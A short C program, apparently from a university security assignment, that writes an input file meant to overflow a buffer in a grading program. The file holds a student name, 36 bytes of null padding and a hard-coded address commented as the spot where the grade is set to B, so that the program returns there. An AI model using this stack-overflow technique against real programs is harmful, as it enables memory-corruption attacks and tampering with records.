#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

int main(void){
    int i;
    unsigned long uiData;
    FILE *psFile;
    /*address where grade='B'*/
    uiData = 0x400858;
    psFile = fopen("dataB", "w");
    
    fprintf(psFile,"Chris Paucar");
    
    for(i = 0; i < 36; i++){
        putc('\0', psFile);
    }
    
    fwrite(&uiData, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    
    return 0;
}
